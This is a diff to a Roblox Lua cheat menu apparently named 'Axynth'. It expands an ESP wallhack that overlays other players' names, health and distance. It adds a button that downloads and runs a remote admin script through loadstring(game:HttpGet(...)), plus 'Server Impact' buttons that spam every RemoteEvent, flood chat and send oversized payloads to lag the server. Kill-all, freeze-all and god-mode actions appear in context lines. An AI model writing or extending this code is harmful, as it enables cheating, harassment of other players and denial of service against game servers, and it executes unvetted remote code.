@@ -513,7 +513,7 @@ end)
 local lastAction=0
 local function cd() local now=tick() if now-lastAction<3 then ntf("Cooldown","Wait "..string.format("%.1f",3-(now-lastAction)).."s") return false end lastAction=now return true end
 local ST = {menuOpen=false,fly=false,noclip=false,clickTP=false,esp=false,spectating=nil,selectedPlayer=nil,flySpeed=50,night=false,bright=false,noFog=false,invisible=false,espList={}}
-local CFG = {ESPColor=Color3.fromRGB(255,0,0),ESPFillAlpha=0.5}
+local CFG = {ESPColor=Color3.fromRGB(255,0,0),ESPOutlineColor=Color3.new(1,1,1),ESPFillAlpha=0.5,ESPOutlineEnabled=true,ESPFillEnabled=true,ESPShowName=true,ESPShowHealth=true,ESPShowDistance=true,ESPShowTracer=false,ESPTracerColor=Color3.fromRGB(255,0,0),ESPTextColor=Color3.new(1,1,1),ESPThickness=2}
 local TH = {p=Color3.fromRGB(18,18,32),s=Color3.fromRGB(24,24,44),b=Color3.fromRGB(35,35,60),bh=Color3.fromRGB(55,55,85),t=Color3.fromRGB(210,210,230),a=Color3.fromRGB(120,120,255),g=Color3.fromRGB(80,255,120),r=Color3.fromRGB(255,80,80)}
 local KB = {}
 local waitingForKey = nil
@@ -649,7 +649,7 @@ sep(tP)
 lbl(tP,">> SPECTATE + ESP")
 btn(tP,"Spectate",function() if ST.selectedPlayer and ST.selectedPlayer.Character then local h=ST.selectedPlayer.Character:FindFirstChildOfClass("Humanoid") if h then CAM.CameraSubject=h CAM.CameraType=Enum.CameraType.Custom ST.spectating=ST.selectedPlayer end end end,"spec")
 btn(tP,"Stop Spectate",function() if LP.Character then local h=LP.Character:FindFirstChildOfClass("Humanoid") if h then CAM.CameraSubject=h end CAM.CameraType=Enum.CameraType.Custom ST.spectating=nil end end,"stopspec")
-local tESP=tog(tP,"ESP",function() return ST.esp end,function() ST.esp=not ST.esp if ST.esp then for _,pp in pairs(P:GetPlayers()) do if pp~=LP and pp.Character and not pp.Character:FindFirstChild("AxESP") then local hl=Instance.new("Highlight") hl.Name="AxESP" hl.FillColor=CFG.ESPColor hl.FillTransparency=CFG.ESPFillAlpha hl.OutlineColor=Color3.new(1,1,1) hl.OutlineTransparency=0 hl.Parent=pp.Character ST.espList[pp.UserId]=hl end end else for id,hl in pairs(ST.espList) do if hl and hl.Parent then hl:Destroy() end ST.espList[id]=nil end end end,"esp")
+local tESP=tog(tP,"ESP",function() return ST.esp end,function() ST.esp=not ST.esp if ST.esp then for _,pp in pairs(P:GetPlayers()) do if pp~=LP and pp.Character and not pp.Character:FindFirstChild("AxESP") then local hl=Instance.new("Highlight") hl.Name="AxESP" hl.FillColor=CFG.ESPColor hl.FillTransparency=CFG.ESPFillAlpha hl.OutlineColor=CFG.ESPOutlineColor hl.OutlineTransparency=CFG.ESPOutlineEnabled and 0 or 1 hl.Enabled=CFG.ESPFillEnabled hl.Parent=pp.Character ST.espList[pp.UserId]=hl end end else for id,hl in pairs(ST.espList) do if hl and hl.Parent then hl:Destroy() end ST.espList[id]=nil end end end,"esp")
 table.insert(allToggles,tESP)
 local tF2=tF["fun"]
 lbl(tF2,">> TROLL ALL")
@@ -742,6 +742,12 @@ btn(tMi,"God Mode",function() sf("godmode",1) end,"godmode")
 btn(tMi,"Anti-AFK",function() pcall(function() LP.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Running) end) end,"antiafk")
 btn(tMi,"Third Person",function() pcall(function() LP.CameraMinZoomDistance=10 LP.CameraMaxZoomDistance=10 end) end,"3rdperson")
 btn(tMi,"First Person",function() pcall(function() LP.CameraMinZoomDistance=0.5 LP.CameraMaxZoomDistance=0.5 end) end,"1stperson")
+btn(tMi,"Infinite Yield Load",function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end) ntf("IY","Loading Infinite Yield...") end,"infyield")
+sep(tMi)
+lbl(tMi,">> SERVER IMPACT")
+btn(tMi,"Spam All Remotes x10",function() if cd() then pcall(function() for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") then for i=1,10 do r:FireServer(math.random(1,999),math.random(1,999),math.random(1,999)) end end end end) ntf("Spam","Fired all remotes 10x") end end,"spamrem")
+btn(tMi,"Spam Chat x50",function() if cd() then pcall(function() for i=1,50 do RS:WaitForChild("Chat"):FireServer("axynth"..math.random(1,999)) end end) ntf("Chat","Spammed 50x") end end,"spamchat")
+btn(tMi,"Lag Server",function() if cd() then pcall(function() for i=1,50 do for _,r in pairs(RS:GetChildren()) do if r:IsA("RemoteEvent") then r:FireServer(string.rep("A",5000)) end end end end) ntf("Lag","Sent heavy payloads") end end,"lagserver")
 sep(tMi)
 lbl(tMi,">> SERVER ACTIONS")
 btn(tMi,"Kill All",function() if cd() then sf("kill",100) end end,"svkill")
@@ -750,6 +756,20 @@ btn(tMi,"Freeze All",function() if cd() then sf("freeze",100) end end,"svfreeze"
 btn(tMi,"Unfreeze All",function() if cd() then sf("unfreeze",100) end end,"svunfreeze")
 btn(tMi,"Revive All",function() if cd() then sf("heal",100) pcall(function() for _,pp in pairs(P:GetPlayers()) do if pp.Character then local h=pp.Character:FindFirstChildOfClass("Humanoid") if h then h.Health=h.MaxHealth h.PlatformStand=false end end end end) ntf("Revive","All revived!") end end,"svrevive")
 local tSe=tF["set"]
+lbl(tSe,">> ESP SETTINGS")
+btn(tSe,"ESP Color: Red",function() CFG.ESPColor=Color3.fromRGB(255,0,0) CFG.ESPTracerColor=Color3.fromRGB(255,0,0) ntf("ESP","Color: Red") end,"espcred")
+btn(tSe,"ESP Color: Green",function() CFG.ESPColor=Color3.fromRGB(0,255,0) CFG.ESPTracerColor=Color3.fromRGB(0,255,0) ntf("ESP","Color: Green") end,"esp cgrn")
+btn(tSe,"ESP Color: Blue",function() CFG.ESPColor=Color3.fromRGB(0,100,255) CFG.ESPTracerColor=Color3.fromRGB(0,100,255) ntf("ESP","Color: Blue") end,"esp cblu")
+btn(tSe,"ESP Color: Rainbow",function() CFG.ESPColor=Color3.fromHSV(math.random(),1,1) CFG.ESPTracerColor=CFG.ESPColor ntf("ESP","Color: Rainbow") end,"esp crnb")
+btn(tSe,"Toggle: Names",function() CFG.ESPShowName=not CFG.ESPShowName ntf("ESP","Names: "..(CFG.ESPShowName and "ON" or "OFF")) end,"espname")
+btn(tSe,"Toggle: Health Bar",function() CFG.ESPShowHealth=not CFG.ESPShowHealth ntf("ESP","Health: "..(CFG.ESPShowHealth and "ON" or "OFF")) end,"esphealth")
+btn(tSe,"Toggle: Distance",function() CFG.ESPShowDistance=not CFG.ESPShowDistance ntf("ESP","Distance: "..(CFG.ESPShowDistance and "ON" or "OFF")) end,"espdist")
+btn(tSe,"Toggle: Fill",function() CFG.ESPFillEnabled=not CFG.ESPFillEnabled ntf("ESP","Fill: "..(CFG.ESPFillEnabled and "ON" or "OFF")) end,"espfill")
+btn(tSe,"Toggle: Outline",function() CFG.ESPOutlineEnabled=not CFG.ESPOutlineEnabled ntf("ESP","Outline: "..(CFG.ESPOutlineEnabled and "ON" or "OFF")) end,"espoline")
+btn(tSe,"Fill Transparency: 0.3",function() CFG.ESPFillAlpha=0.3 ntf("ESP","Fill alpha: 0.3") end,"espfa3")
+btn(tSe,"Fill Transparency: 0.5",function() CFG.ESPFillAlpha=0.5 ntf("ESP","Fill alpha: 0.5") end,"espfa5")
+btn(tSe,"Fill Transparency: 0.8",function() CFG.ESPFillAlpha=0.8 ntf("ESP","Fill alpha: 0.8") end,"espfa8")
+sep(tSe)
 lbl(tSe,">> THEME")
 btn(tSe,"Dark Purple",function() TH.p=Color3.fromRGB(18,18,32) TH.s=Color3.fromRGB(24,24,44) TH.b=Color3.fromRGB(35,35,60) TH.bh=Color3.fromRGB(55,55,85) TH.a=Color3.fromRGB(120,120,255) MF.BackgroundColor3=TH.p end,"thpurple")
 btn(tSe,"Dark Red",function() TH.p=Color3.fromRGB(28,12,12) TH.s=Color3.fromRGB(38,16,16) TH.b=Color3.fromRGB(55,25,25) TH.bh=Color3.fromRGB(75,35,35) TH.a=Color3.fromRGB(255,80,80) MF.BackgroundColor3=TH.p end,"thred")
@@ -789,9 +809,76 @@ R.RenderStepped:Connect(function()
     if ST.fly and LP.Character then local h=LP.Character:FindFirstChild("HumanoidRootPart") if h then h.Velocity=Vector3.new(0,0,0) h.RotVelocity=Vector3.new(0,0,0) local dir=Vector3.new(0,0,0) if U:IsKeyDown(Enum.KeyCode.W) then dir=dir+CAM.CFrame.LookVector end if U:IsKeyDown(Enum.KeyCode.S) then dir=dir-CAM.CFrame.LookVector end if U:IsKeyDown(Enum.KeyCode.A) then dir=dir-CAM.CFrame.RightVector end if U:IsKeyDown(Enum.KeyCode.D) then dir=dir+CAM.CFrame.RightVector end if U:IsKeyDown(Enum.KeyCode.Space) then dir=dir+Vector3.new(0,1,0) end if U:IsKeyDown(Enum.KeyCode.LeftShift) then dir=dir-Vector3.new(0,1,0) end if dir.Magnitude>0 then dir=dir.Unit end h.CFrame=h.CFrame+dir*ST.flySpeed*R.RenderStepped:Wait() end end
     if ST.noclip and LP.Character then for _,p2 in pairs(LP.Character:GetDescendants()) do if p2:IsA("BasePart") then p2.CanCollide=false end end end
     if ST.freeCam then CAM.CameraType=Enum.CameraType.Scriptable local dir=Vector3.new(0,0,0) local sp=1 if U:IsKeyDown(Enum.KeyCode.LeftShift) then sp=2 end if U:IsKeyDown(Enum.KeyCode.W) then dir=dir+CAM.CFrame.LookVector end if U:IsKeyDown(Enum.KeyCode.S) then dir=dir-CAM.CFrame.LookVector end if U:IsKeyDown(Enum.KeyCode.A) then dir=dir-CAM.CFrame.RightVector end if U:IsKeyDown(Enum.KeyCode.D) then dir=dir+CAM.CFrame.RightVector end CAM.CFrame=CAM.CFrame+dir*sp end
+    if ST.esp and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+        local myPos=LP.Character.HumanoidRootPart.Position
+        for _,pp in pairs(P:GetPlayers()) do
+            if pp~=LP and pp.Character and pp.Character:FindFirstChild("HumanoidRootPart") and pp.Character:FindFirstChildOfClass("Humanoid") then
+                local hrp=pp.Character.HumanoidRootPart
+                local hum=pp.Character:FindFirstChildOfClass("Humanoid")
+                local dist=(myPos-hrp.Position).Magnitude
+                local head=pp.Character:FindFirstChild("Head")
+                local headY=head and head.Position.Y+3 or hrp.Position.Y+3
+                local bb=pp.Character:FindFirstChild("AxESP_BB")
+                if not bb then
+                    bb=Instance.new("BillboardGui") bb.Name="AxESP_BB" bb.Size=UDim2.new(0,200,0,50) bb.StudsOffset=Vector3.new(0,3.5,0) bb.AlwaysOnTop=true bb.LightInfluence=0 bb.Parent=pp.Character
+                    local nL=Instance.new("TextLabel") nL.Name="NL" nL.Size=UDim2.new(1,0,0.4,0) nL.Position=UDim2.new(0,0,0,0) nL.BackgroundTransparency=1 nL.TextColor3=CFG.ESPTextColor nL.TextStrokeTransparency=0.5 nL.TextStrokeColor3=Color3.new(0,0,0) nL.TextSize=14 nL.Font=Enum.Font.GothamBold nL.Parent=bb
+                    local hB=Instance.new("Frame") hB.Name="HB" hB.Size=UDim2.new(0.8,0,0.2,0) hB.Position=UDim2.new(0.1,0,0.5,0) hB.BackgroundColor3=Color3.new(0.2,0.2,0.2) hB.BorderSizePixel=0 hB.Parent=bb
+                    local hF=Instance.new("Frame") hF.Name="HF" hF.Size=UDim2.new(1,0,1,0) hF.BackgroundColor3=TH.g hF.BorderSizePixel=0 hF.Parent=hB
+                    local dL=Instance.new("TextLabel") dL.Name="DL" dL.Size=UDim2.new(1,0,0.3,0) dL.Position=UDim2.new(0,0,0.7,0) dL.BackgroundTransparency=1 dL.TextColor3=CFG.ESPTextColor dL.TextStrokeTransparency=0.5 dL.TextStrokeColor3=Color3.new(0,0,0) dL.TextSize=10 dL.Font=Enum.Font.Gotham dL.Parent=bb
+                end
+                local nL=bb:FindFirstChild("NL")
+                local hB=bb:FindFirstChild("HB")
+                local hF=hB and hB:FindFirstChild("HF")
+                local dL=bb:FindFirstChild("DL")
+                if nL then
+                    local txt=""
+                    if CFG.ESPShowName then txt=txt..pp.DisplayName end
+                    if CFG.ESPShowHealth then txt=txt.." ["..math.floor(hum.Health).."/"..math.floor(hum.MaxHealth).."]" end
+                    nL.Text=txt
+                    nL.TextColor3=CFG.ESPTextColor
+                    nL.Visible=CFG.ESPShowName or CFG.ESPShowHealth
+                end
+                if hB then
+                    hB.Visible=CFG.ESPShowHealth
+                    if hF then
+                        local hp=math.clamp(hum.Health/hum.MaxHealth,0,1)
+                        hF.Size=UDim2.new(hp,0,1,0)
+                        if hp>0.5 then hF.BackgroundColor3=TH.g elseif hp>0.25 then hF.BackgroundColor3=Color3.fromRGB(255,200,0) else hF.BackgroundColor3=TH.r end
+                    end
+                end
+                if dL then
+                    dL.Visible=CFG.ESPShowDistance
+                    dL.Text=math.floor(dist).."m"
+                    dL.TextColor3=CFG.ESPTextColor
+                end
+                local hl=pp.Character:FindFirstChild("AxESP")
+                if hl then
+                    hl.FillColor=CFG.ESPColor
+                    hl.FillTransparency=CFG.ESPFillEnabled and CFG.ESPFillAlpha or 1
+                    hl.OutlineColor=CFG.ESPOutlineColor
+                    hl.OutlineTransparency=CFG.ESPOutlineEnabled and 0 or 1
+                end
+            end
+        end
+    end
+    if ST.esp then
+        for uid,hl in pairs(ST.espList) do
+            local pp=P:GetPlayerByUserId(uid)
+            if not pp or not pp.Character or not pp.Character:FindFirstChild("HumanoidRootPart") then
+                if hl and hl.Parent then hl:Destroy() end
+                ST.espList[uid]=nil
+            end
+        end
+        for _,pp in pairs(P:GetPlayers()) do
+            if pp~=LP and pp.Character and not ST.espList[pp.UserId] then
+                local hl=Instance.new("Highlight") hl.Name="AxESP" hl.FillColor=CFG.ESPColor hl.FillTransparency=CFG.ESPFillEnabled and CFG.ESPFillAlpha or 1 hl.OutlineColor=CFG.ESPOutlineColor hl.OutlineTransparency=CFG.ESPOutlineEnabled and 0 or 1 hl.Parent=pp.Character ST.espList[pp.UserId]=hl
+            end
+        end
+    end
 end)
 P.PlayerAdded:Connect(function(pp) pp.CharacterAdded:Connect(function(ch) wait(1) if ST.esp and pp~=LP then local hl=Instance.new("Highlight") hl.Name="AxESP" hl.FillColor=CFG.ESPColor hl.FillTransparency=CFG.ESPFillAlpha hl.OutlineColor=Color3.new(1,1,1) hl.OutlineTransparency=0 hl.Parent=ch ST.espList[pp.UserId]=hl end end) end)
 P.PlayerRemoving:Connect(function(pp) if ST.espList[pp.UserId] then ST.espList[pp.UserId]:Destroy() ST.espList[pp.UserId]=nil end end)
+for _,pp in pairs(P:GetPlayers()) do if pp~=LP and pp.Character and pp.Character:FindFirstChild("AxESP_BB") then pp.Character.AxESP_BB:Destroy() end end
 print("[Axynth] MENU LOADED! Press F4!")
 end)
 if not ok then print("[Axynth] ERROR: "..tostring(err)) end
